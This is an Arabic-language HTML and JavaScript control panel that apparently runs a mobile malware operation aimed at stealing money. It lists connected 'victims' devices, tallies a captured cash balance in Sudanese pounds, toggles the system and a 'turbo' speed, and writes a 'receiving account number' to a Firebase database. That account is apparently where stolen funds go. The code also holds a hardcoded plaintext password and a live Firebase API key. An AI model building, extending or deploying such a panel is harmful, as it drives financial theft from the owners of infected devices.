<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة تحكم الدولي</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0b0e14;
            --accent: #00d2ff;
            --accent-dark: #3a7bd5;
            --card-bg: rgba(22, 27, 34, 0.8);
            --text-main: #e6edf3;
            --success: #238636;
            --danger: #f85149;
            --warning: #d29922;
        }

        body {
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            background-image: radial-gradient(circle at 50% 50%, #161b22 0%, #0b0e14 100%);
            color: var(--text-main);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
        }

        /* شاشة قفل الصفحة */
        #lock-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg-color); z-index: 9999;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }
        .lock-box { background: var(--card-bg); padding: 30px; border-radius: 15px; border: 1px solid #30363d; text-align: center; }

        .container { max-width: 1200px; margin: 0 auto; display: none; } /* مخفي حتى إدخال الرمز */

        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 20px; background: var(--card-bg); border: 1px solid #30363d;
            border-radius: 15px; margin-bottom: 25px; backdrop-filter: blur(10px);
        }

        .header h1 { margin: 0; font-size: 24px; background: linear-gradient(to left, var(--accent), var(--accent-dark)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 25px; }
        .stat-card { background: var(--card-bg); border: 1px solid #30363d; padding: 20px; border-radius: 15px; position: relative; overflow: hidden; }
        .stat-label { color: #8b949e; font-size: 14px; margin-bottom: 10px; }
        .stat-value { font-size: 26px; font-weight: bold; font-family: 'Consolas', monospace; }

        .main-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
        @media (max-width: 900px) { .main-grid { grid-template-columns: 1fr; } }

        .panel { background: var(--card-bg); border: 1px solid #30363d; border-radius: 15px; padding: 20px; }
        .panel-title { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #30363d; padding-bottom: 10px; }

        input[type="text"], input[type="password"] {
            width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d;
            color: white; border-radius: 8px; margin-top: 8px; outline: none; box-sizing: border-box;
        }

        .btn {
            width: 100%; padding: 14px; border-radius: 8px; border: none; font-weight: bold;
            cursor: pointer; transition: 0.3s; display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 10px;
        }
        .btn-primary { background: linear-gradient(45deg, var(--accent-dark), var(--accent)); color: white; }
        .btn-toggle { background: #21262d; color: var(--text-main); border: 1px solid #30363d; }
        .active-on { background: var(--success) !important; color: white; }
        .active-fast { background: var(--warning) !important; color: #000; }

        .device-item {
            background: rgba(13, 17, 23, 0.6); border: 1px solid #30363d;
            padding: 12px 15px; border-radius: 10px; margin-bottom: 10px;
            display: flex; justify-content: space-between; align-items: center;
        }
        
        .footer {
            text-align: center; margin-top: 50px; padding: 20px;
            color: #8b949e; font-size: 14px; border-top: 1px solid #30363d;
        }
    </style>
</head>
<body>

<div id="lock-screen">
    <div class="lock-box">
        <i class="fas fa-user-shield" style="font-size: 50px; color: var(--accent); margin-bottom: 15px;"></i>
        <h2>لوحة تحكم الدولي</h2>
        <p style="color: #8b949e;">يرجى إدخال كلمة المرور للمتابعة</p>
        <input type="password" id="pass-input" placeholder="كلمة المرور">
        <button class="btn btn-primary" onclick="checkPass()">دخول النظام</button>
    </div>
</div>

<div class="container" id="main-content">
    <div class="header">
        <h1><i class="fas fa-bolt"></i> لوحة تحكم الدولي</h1>
        <div id="net-status" style="font-size: 12px; color: var(--success);"><i class="fas fa-signal"></i> متصل بالسيرفر</div>
    </div>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-label">إجمالي الرصيد المرصود</div>
            <div id="cash-display" class="stat-value" style="color: var(--success);">0.00 SDG</div>
        </div>
        <div class="stat-card">
            <div class="stat-label">الأجهزة المتصلة</div>
            <div id="device-count" class="stat-value">0</div>
        </div>
        <div class="stat-card">
            <div class="stat-label">آخر تحديث</div>
            <div id="last-time" class="stat-value" style="font-size: 18px;">--:--:--</div>
        </div>
    </div>

    <div class="main-grid">
        <div class="panel">
            <div class="panel-title"><i class="fas fa-list"></i> الأجهزة المتصلة (الضحايا)</div>
            <div id="activate-list">جاري التحميل...</div>
        </div>

        <div class="panel">
            <div class="panel-title"><i class="fas fa-cog"></i> الإعدادات العامة</div>
            <button id="system-btn" class="btn btn-toggle" onclick="toggleStatus()">تحميل...</button>
            <button id="turbo-btn" class="btn btn-toggle" onclick="toggleTurbo()">تحميل...</button>
            <div style="margin-top:20px;">
                <label class="stat-label">رقم حساب الاستقبال</label>
                <input type="text" id="target-acc" placeholder="أدخل الرقم هنا">
                <button class="btn btn-primary" onclick="executeCommand()">تحديث البيانات</button>
            </div>
        </div>
    </div>

    <div class="footer">
        برمحة وتصميم عباس الدولي @2026
    </div>
</div>

<script>
    // كلمة المرور المطلوبة
    function checkPass() {
        const pass = document.getElementById('pass-input').value;
        if(pass === "abbasaldoly123") {
            document.getElementById('lock-screen').style.display = 'none';
            document.getElementById('main-content').style.display = 'block';
            startSystem(); // بدء تشغيل الفايربيز بعد الدخول
        } else {
            alert("كلمة المرور خاطئة!");
        }
    }

    const firebaseConfig = {
        apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
        authDomain: "sudancontrol-c5050.firebaseapp.com",
        databaseURL: "https://sudancontrol-c5050-default-rtdb.firebaseio.com",
        projectId: "sudancontrol-c5050",
        appId: "1:111262781250:android:1b7bebdb45d69df294c2db"
    };

    function startSystem() {
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentSystemState = false;
        let currentTurboState = false;

        db.ref('Settings/System').on('value', (snap) => {
            const btn = document.getElementById('system-btn');
            currentSystemState = snap.val() === "ON";
            btn.innerHTML = currentSystemState ? "النظام نشط" : "النظام متوقف";
            btn.className = currentSystemState ? "btn btn-toggle active-on" : "btn btn-toggle";
        });

        db.ref('Settings/Speed').on('value', (snap) => {
            const btn = document.getElementById('turbo-btn');
            currentTurboState = snap.val() === "FAST";
            btn.innerHTML = currentTurboState ? "تيربو: سريع" : "تيربو: عادي";
            btn.className = currentTurboState ? "btn btn-toggle active-fast" : "btn btn-toggle";
        });

        window.toggleStatus = () => db.ref('Settings/System').set(currentSystemState ? "OFF" : "ON");
        window.toggleTurbo = () => db.ref('Settings/Speed').set(currentTurboState ? "SLOW" : "FAST");

        db.ref('Cash').on('value', (snap) => {
            if(snap.exists()){
                document.getElementById('cash-display').innerText = snap.val() + " SDG";
                document.getElementById('last-time').innerText = new Date().toLocaleTimeString();
            }
        });

        db.ref('activate').on('value', (snap) => {
            const listDiv = document.getElementById('activate-list');
            listDiv.innerHTML = "";
            let count = 0;
            if (snap.exists()) {
                Object.keys(snap.val()).forEach(id => {
                    count++;
                    listDiv.innerHTML += `<div class="device-item"><span>ID: ${id}</span><span style="color:var(--success)">Active</span></div>`;
                });
            }
            document.getElementById('device-count').innerText = count;
        });

        window.executeCommand = () => {
            const acc = document.getElementById('target-acc').value;
            if(acc) db.ref('Account').set(acc).then(() => alert("تم التحديث"));
        }
    }
</script>
</body>
</html>
